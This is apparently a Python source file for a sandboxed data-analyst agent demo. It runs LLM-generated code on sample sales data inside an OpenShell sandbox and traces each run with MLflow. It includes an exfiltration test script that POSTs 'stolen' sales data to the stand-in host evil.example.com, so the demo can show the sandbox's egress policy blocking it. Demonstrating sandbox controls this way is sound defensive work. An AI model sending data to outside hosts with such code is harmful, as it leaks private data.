#!/usr/bin/env python3
"""Chat UI: OAuth-authenticated users run an analyst agent INSIDE an OpenShell sandbox."""

import json
import logging
import os
import time
from pathlib import Path
from contextlib import asynccontextmanager
from typing import Sequence

from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from openshell import SandboxClient, TlsConfig

import mlflow

MLFLOW_TRACKING_URI = os.environ.get("MLFLOW_TRACKING_URI", "")
MLFLOW_EXPERIMENT = os.environ.get("MLFLOW_EXPERIMENT", "secure-agent-sandbox")


@asynccontextmanager
async def lifespan(app):
    if MLFLOW_TRACKING_URI:
        try:
            token_file = os.environ.get("MLFLOW_TRACKING_TOKEN_FILE", "")
            if token_file and Path(token_file).exists():
                os.environ["MLFLOW_TRACKING_TOKEN"] = Path(token_file).read_text().strip()
            os.environ["MLFLOW_WORKSPACE"] = os.environ.get("POD_NAMESPACE", "agent-sandbox-demo")
            mlflow.set_tracking_uri(MLFLOW_TRACKING_URI)
            mlflow.set_experiment(MLFLOW_EXPERIMENT)
            log.info("MLflow tracing → %s (experiment: %s)", MLFLOW_TRACKING_URI, MLFLOW_EXPERIMENT)
        except Exception as e:
            log.warning("MLflow init failed (non-blocking): %s", e)
    yield

app = FastAPI(lifespan=lifespan)
log = logging.getLogger("chat")
logging.basicConfig(level=logging.INFO)

GATEWAY_ENDPOINT = os.environ.get("OPENSHELL_GATEWAY_ENDPOINT", "openshell.openshell.svc.cluster.local:8080")
WORKSPACE = os.environ.get("OPENSHELL_WORKSPACE", "default")
MAAS_URL = os.environ.get("MAAS_URL", "")
MAAS_MODEL = os.environ.get("MAAS_MODEL", "qwen35-9b")

NETWORK_BLOCK_SIGNALS = ("Tunnel connection failed", "403 Forbidden", "not allowed by any policy")

ANALYST_SCRIPT = r'''
import csv, json, sys, urllib.request, os, io, time as _t
from contextlib import redirect_stdout

CSV_DATA = """date,region,product,units,revenue
2026-01-15,EMEA,Widget-A,120,14400
2026-01-15,APAC,Widget-A,85,10200
2026-01-15,AMER,Widget-B,200,30000
2026-02-10,EMEA,Widget-A,95,11400
2026-02-10,APAC,Widget-B,150,22500
2026-02-10,AMER,Widget-A,175,21000
2026-03-05,EMEA,Widget-B,210,31500
2026-03-05,APAC,Widget-A,60,7200
2026-03-05,AMER,Widget-B,300,45000
2026-04-20,EMEA,Widget-A,140,16800
2026-04-20,APAC,Widget-B,110,16500
2026-04-20,AMER,Widget-A,250,30000
2026-05-12,EMEA,Widget-B,180,27000
2026-05-12,APAC,Widget-A,70,8400
2026-05-12,AMER,Widget-B,320,48000
2026-06-01,EMEA,Widget-A,160,19200
2026-06-01,APAC,Widget-B,130,19500
2026-06-01,AMER,Widget-A,280,33600"""

rows = [{**r, "units": int(r["units"]), "revenue": int(r["revenue"])}
        for r in csv.DictReader(io.StringIO(CSV_DATA))]

PROMPT = """You are a code generator. Output ONLY valid Python code. No text, no explanation, no markdown, no thinking.
The variable `rows` is a list of dicts with keys: date, region, product, units (int), revenue (int).
Write code that computes and prints the answer. Use only the standard library. Do NOT redefine `rows`.
Your entire response must be executable Python. Nothing else."""

question = sys.argv[1]
payload = json.dumps({"model": os.environ["MAAS_MODEL"], "messages": [
    {"role": "system", "content": PROMPT},
    {"role": "user", "content": f"Data sample: {json.dumps(rows[:3])}\nQuestion: {question}"}
], "temperature": 0, "max_tokens": 512, "chat_template_kwargs": {"enable_thinking": False}}).encode()

headers = {"Content-Type": "application/json"}
api_key = os.environ.get("MAAS_API_KEY", "")
if api_key:
    headers["Authorization"] = f"Bearer {api_key}"

_t0 = _t.time()
req = urllib.request.Request(os.environ["MAAS_URL"], data=payload, headers=headers, method="POST")
resp = urllib.request.urlopen(req, timeout=30)
llm_body = json.loads(resp.read())
_duration = int((_t.time() - _t0) * 1000)
raw_response = llm_body["choices"][0]["message"]["content"].strip()
code = raw_response.removeprefix("```python").removeprefix("```").removesuffix("```").strip()

usage = llm_body.get("usage", {})
print("__META__")
print(json.dumps({
    "model": llm_body.get("model", ""),
    "prompt_tokens": usage.get("prompt_tokens", 0),
    "completion_tokens": usage.get("completion_tokens", 0),
    "total_tokens": usage.get("total_tokens", 0),
    "llm_duration_ms": _duration,
}))
print("__END_META__")
print("__CODE__")
print(code)
print("__END_CODE__")
buf = io.StringIO()
with redirect_stdout(buf):
    exec(code, {"rows": rows, "__builtins__": __builtins__})
print("__RESULT__")
print(buf.getvalue().strip())
print("__END_RESULT__")
'''

EXFIL_SCRIPT = r'''
import urllib.request, json
data = json.dumps({"stolen": "sensitive-sales-data", "revenue": 297900}).encode()
req = urllib.request.Request("https://evil.example.com/exfil", data=data,
    headers={"Content-Type": "application/json"}, method="POST")
try:
    urllib.request.urlopen(req, timeout=5)
    print("__EXFIL_OK__")
except Exception as e:
    print(f"__EXFIL_BLOCKED__{e}")
'''


# ---------------------------------------------------------------------------
# OpenShell client
# ---------------------------------------------------------------------------

_client: SandboxClient | None = None


def _get_client() -> SandboxClient:
    global _client
    if _client is not None:
        return _client
    tls_dir = os.environ.get("OPENSHELL_TLS_DIR", "")
    if tls_dir:
        _client = SandboxClient(GATEWAY_ENDPOINT, tls=TlsConfig(
            ca_path=Path(tls_dir) / "ca.crt",
            cert_path=Path(tls_dir) / "tls.crt",
            key_path=Path(tls_dir) / "tls.key",
        ))
    else:
        _client = SandboxClient(GATEWAY_ENDPOINT)
    return _client


def _get_session(username: str):
    client = _get_client()
    sandboxes = client.list(workspace=WORKSPACE, label_selector=f"owner={username}")
    if not sandboxes:
        raise RuntimeError(f"No sandbox for '{username}'. Create: openshell sandbox create --name analyst-{username} --label owner={username}")
    return client.get_session(sandboxes[0].name, workspace=WORKSPACE)


def _is_network_blocked(output: str) -> bool:
    return any(sig in output for sig in NETWORK_BLOCK_SIGNALS)


def _parse_output(raw: str) -> tuple[str, str, dict]:
    code = result = ""
    meta = {}
    if "__META__" in raw and "__END_META__" in raw:
        try:
            meta = json.loads(raw.split("__META__")[1].split("__END_META__")[0].strip())
        except Exception:
            pass
    if "__CODE__" in raw and "__END_CODE__" in raw:
        code = raw.split("__CODE__")[1].split("__END_CODE__")[0].strip()
    if "__RESULT__" in raw and "__END_RESULT__" in raw:
        result = raw.split("__RESULT__")[1].split("__END_RESULT__")[0].strip()
    return code, result, meta


# ---------------------------------------------------------------------------
# Models
# ---------------------------------------------------------------------------

class AskRequest(BaseModel):
    question: str


class AskResponse(BaseModel):
    question: str
    user: str
    sandbox: str
    code: str
    result: str
    verdict: str
    blocked: bool


# ---------------------------------------------------------------------------
# Generic traced sandbox execution
# ---------------------------------------------------------------------------

_sessions: dict[str, str] = {}


def _session_id(username: str) -> str:
    if username not in _sessions:
        _sessions[username] = f"{username}-{int(time.time())}"
    return _sessions[username]


def _exec_in_sandbox(username: str, command: Sequence[str], env: dict | None = None, timeout: int = 60):
    session = _get_session(username)
    result = session.exec(command, env=env, timeout_seconds=timeout)
    return session.sandbox.name, session.sandbox.id, result


@mlflow.trace(name="sandbox_agent", span_type="AGENT")
def traced_ask(question: str, username: str, model: str) -> tuple[str, str, int]:
    sid = _session_id(username)
    mlflow.update_current_trace(
        session_id=sid, user=username,
        request_preview=question[:500],
        tags={"agent": "secure-analyst", "agent_version": "1.0", "model": model,
              "sandbox_runtime": "openshell", "platform": "RHOAI 3.5"},
    )

    env = {"MAAS_URL": MAAS_URL, "MAAS_MODEL": model}
    api_key = os.environ.get("MAAS_API_KEY", "")
    if api_key:
        env["MAAS_API_KEY"] = api_key

    with mlflow.start_span(name="sandbox_lookup", span_type="RETRIEVER") as span:
        span.set_inputs({"user": username, "workspace": WORKSPACE})
        sandbox_name, sandbox_id, result = _exec_in_sandbox(
            username, ["python3", "-c", ANALYST_SCRIPT, question], env=env)
        span.set_outputs({"sandbox": sandbox_name, "id": sandbox_id})

    stdout = result.stdout or ""
    stderr = result.stderr or ""
    code, answer, meta = _parse_output(stdout)

    if _is_network_blocked(stdout + stderr):
        with mlflow.start_span(name="proxy_verdict", span_type="TOOL") as span:
            span.set_inputs({"endpoint": MAAS_URL})
            span.set_outputs({"verdict": "DENIED", "reason": "no egress rule"})
        mlflow.update_current_trace(response_preview="BLOCKED")
        return stdout, stderr, result.exit_code

    with mlflow.start_span(name="llm_inference", span_type="LLM") as span:
        span.set_inputs({"question": question, "model": meta.get("model", model), "endpoint": MAAS_URL})
        span.set_outputs({"generated_code": code[:500], "answer": answer[:500]})
        span.set_attributes({
            "llm.model": meta.get("model", model),
            "llm.prompt_tokens": meta.get("prompt_tokens", 0),
            "llm.completion_tokens": meta.get("completion_tokens", 0),
            "llm.total_tokens": meta.get("total_tokens", 0),
            "llm.duration_ms": meta.get("llm_duration_ms", 0),
        })

    with mlflow.start_span(name="code_execution", span_type="TOOL") as span:
        span.set_inputs({"code": code[:500], "sandbox": sandbox_name})
        span.set_outputs({"result": answer[:500], "exit_code": result.exit_code})

    with mlflow.start_span(name="proxy_verdict", span_type="TOOL") as span:
        span.set_inputs({"endpoint": MAAS_URL})
        span.set_outputs({"verdict": "ALLOWED", "policy": "maas_inference"})

    mlflow.update_current_trace(response_preview=answer[:500] if answer else "code error")
    return stdout, stderr, result.exit_code


@mlflow.trace(name="exfiltration_test", span_type="AGENT")
def traced_exfil(username: str) -> tuple[str, str, int]:
    sid = _session_id(username)
    mlflow.update_current_trace(
        session_id=sid, user=username,
        request_preview="POST https://evil.example.com/exfil",
        tags={"agent": "exfil-test", "action": "data_exfiltration", "sandbox_runtime": "openshell"},
    )

    with mlflow.start_span(name="sandbox_lookup", span_type="RETRIEVER") as span:
        span.set_inputs({"user": username})
        sandbox_name, sandbox_id, result = _exec_in_sandbox(
            username, ["python3", "-c", EXFIL_SCRIPT], timeout=15)
        span.set_outputs({"sandbox": sandbox_name, "id": sandbox_id})

    raw = (result.stdout or "") + (result.stderr or "")
    blocked = "__EXFIL_BLOCKED__" in raw or result.exit_code != 0

    with mlflow.start_span(name="proxy_verdict", span_type="TOOL") as span:
        span.set_inputs({"target": "evil.example.com:443", "payload": '{"stolen":"sales-data"}'})
        span.set_outputs({"verdict": "DENIED" if blocked else "ALLOWED"})

    mlflow.update_current_trace(response_preview="BLOCKED" if blocked else "EXFILTRATED")
    return result.stdout or "", result.stderr or "", result.exit_code


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _user(request: Request) -> str:
    return request.headers.get("X-Forwarded-User", "anonymous")


def _blocked_response(question: str, username: str, sandbox: str, detail: str) -> AskResponse:
    return AskResponse(question=question, user=username, sandbox=sandbox,
        code="", result=detail, verdict="BLOCKED — sandbox network policy denied the request", blocked=True)


def _error_response(question: str, username: str, detail: str) -> AskResponse:
    return AskResponse(question=question, user=username, sandbox="",
        code="", result=detail, verdict=f"ERROR — {detail[:120]}", blocked=False)


# ---------------------------------------------------------------------------
# Endpoints
# ---------------------------------------------------------------------------

@app.get("/whoami")
def whoami(request: Request):
    return {"user": _user(request)}


@app.post("/ask")
def ask(req: AskRequest, request: Request):
    username = _user(request)
    try:
        stdout, stderr, exit_code = traced_ask(req.question, username, MAAS_MODEL)
    except Exception as e:
        return _error_response(req.question, username, str(e))

    if _is_network_blocked(stdout + stderr):
        return _blocked_response(req.question, username, "",
            "MaaS access denied by sandbox policy.\n\nApply: openshell policy set <sandbox> --policy policies/analyst.yaml --wait")

    code, answer, _ = _parse_output(stdout)
    if not answer and exit_code != 0:
        return AskResponse(question=req.question, user=username, sandbox="",
            code=code, result=stderr or (stdout + stderr)[:500],
            verdict="ALLOWED — MaaS reached, but the generated code failed", blocked=False)

    return AskResponse(question=req.question, user=username, sandbox="",
        code=code, result=answer, verdict="ALLOWED — code executed inside sandbox", blocked=False)


@app.post("/exfil")
def exfil(request: Request):
    username = _user(request)
    try:
        stdout, stderr, exit_code = traced_exfil(username)
    except Exception as e:
        return _error_response("Exfiltration attempt", username, str(e))

    blocked = "__EXFIL_BLOCKED__" in (stdout + stderr) or exit_code != 0
    return AskResponse(
        question="Exfiltration attempt", user=username, sandbox="",
        code='POST https://evil.example.com/exfil {"stolen":"sensitive-sales-data"}',
        result="Connection denied." if blocked else "Data exfiltrated!",
        verdict="BLOCKED — outbound connection denied by sandbox policy" if blocked else "WARNING — exfiltration succeeded!",
        blocked=blocked,
    )


# ---------------------------------------------------------------------------
# HTML UI
# ---------------------------------------------------------------------------

@app.get("/", response_class=HTMLResponse)
def index(request: Request):
    return HTML_PAGE.replace("{{USER}}", _user(request))


HTML_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Secure Agent Sandbox</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0d1117;color:#c9d1d9;font-family:'JetBrains Mono',monospace;font-size:18px;padding:2rem}
h1{color:#58a6ff;font-size:2rem;margin-bottom:.5rem}
.subtitle{color:#8b949e;font-size:1rem;margin-bottom:.5rem}
.user-badge{background:#1f6feb33;border:1px solid #1f6feb;border-radius:6px;padding:.4rem .8rem;display:inline-block;margin-bottom:1.5rem;font-size:.9rem}
.user-badge span{color:#58a6ff;font-weight:bold}
.input-row{display:flex;gap:1rem;margin-bottom:1.5rem}
input[type=text]{flex:1;background:#161b22;border:1px solid #30363d;border-radius:8px;color:#c9d1d9;font-size:1.1rem;padding:.8rem 1rem;font-family:inherit}
input[type=text]:focus{outline:none;border-color:#58a6ff}
button{background:#238636;border:none;border-radius:8px;color:#fff;cursor:pointer;font-size:1rem;padding:.8rem 1.5rem;font-family:inherit;white-space:nowrap}
button:hover{background:#2ea043}
button.danger{background:#da3633}
button.danger:hover{background:#f85149}
button:disabled{opacity:.5;cursor:wait}
.panel{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:1.2rem;margin-bottom:1.2rem}
.panel h2{color:#58a6ff;font-size:1.1rem;margin-bottom:.8rem}
.panel h2 .tag{font-size:.75rem;background:#30363d;padding:.2rem .5rem;border-radius:4px;margin-left:.5rem;color:#8b949e;font-weight:normal}
pre{white-space:pre-wrap;word-wrap:break-word;font-size:.95rem;line-height:1.5}
.verdict{font-size:1.3rem;font-weight:bold;padding:.8rem 1.2rem;border-radius:8px;text-align:center;margin-top:1rem}
.verdict.allowed{background:#0d2818;border:2px solid #238636;color:#3fb950}
.verdict.blocked{background:#2d1215;border:2px solid #da3633;color:#f85149}
.verdict.error{background:#2d2000;border:2px solid #d29922;color:#e3b341}
.spinner{display:none;color:#58a6ff;font-size:1.1rem;margin:1rem 0}
.spinner.active{display:block}
.sandbox-info{color:#8b949e;font-size:.85rem;margin-top:.5rem}
</style>
</head>
<body>
<h1>Secure Agent Sandbox</h1>
<p class="subtitle">AI analyst that RUNS CODE, safely &mdash; powered by OpenShell + RHOAI</p>
<div class="user-badge">Authenticated as <span>{{USER}}</span> via OpenShift OAuth</div>

<div class="input-row">
  <input type="text" id="question" placeholder="Ask about the sales data..." value="What is the total revenue by region?">
  <button id="ask-btn" onclick="askQuestion()">Ask</button>
  <button class="danger" id="exfil-btn" onclick="tryExfil()">Try Exfiltration</button>
</div>

<div class="spinner" id="spinner">Running agent in sandbox...</div>

<div class="panel" id="sandbox-panel" style="display:none">
  <h2>Sandbox <span class="tag" id="sandbox-name"></span></h2>
  <p class="sandbox-info">Code executes inside an isolated OpenShell sandbox — not on the server.</p>
</div>

<div class="panel" id="code-panel" style="display:none">
  <h2>Generated Code <span class="tag">executed in sandbox</span></h2>
  <pre id="code-output"></pre>
</div>

<div class="panel" id="result-panel" style="display:none">
  <h2>Result</h2>
  <pre id="result-output"></pre>
</div>

<div id="verdict-container"></div>

<script>
async function askQuestion(){
  const q=document.getElementById('question').value.trim();
  if(!q)return;
  setLoading(true);clearPanels();
  try{
    const r=await fetch('/ask',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({question:q})});
    const d=await r.json();showResult(d);
  }catch(e){showError(e.message)}
  setLoading(false);
}
async function tryExfil(){
  setLoading(true);clearPanels();
  try{
    const r=await fetch('/exfil',{method:'POST'});
    const d=await r.json();showResult(d);
  }catch(e){showError(e.message)}
  setLoading(false);
}
function showResult(d){
  if(d.sandbox){document.getElementById('sandbox-panel').style.display='block';document.getElementById('sandbox-name').textContent=d.sandbox}
  if(d.code){document.getElementById('code-panel').style.display='block';document.getElementById('code-output').textContent=d.code}
  if(d.result){document.getElementById('result-panel').style.display='block';document.getElementById('result-output').textContent=d.result}
  const cls=d.blocked?'blocked':d.verdict.includes('ERROR')?'error':'allowed';
  document.getElementById('verdict-container').innerHTML='<div class="verdict '+cls+'">'+d.verdict+'</div>';
}
function showError(msg){document.getElementById('verdict-container').innerHTML='<div class="verdict error">ERROR: '+msg+'</div>'}
function clearPanels(){['sandbox-panel','code-panel','result-panel'].forEach(id=>document.getElementById(id).style.display='none');document.getElementById('verdict-container').innerHTML=''}
function setLoading(on){document.getElementById('spinner').className=on?'spinner active':'spinner';document.getElementById('ask-btn').disabled=on;document.getElementById('exfil-btn').disabled=on}
</script>
</body>
</html>
"""
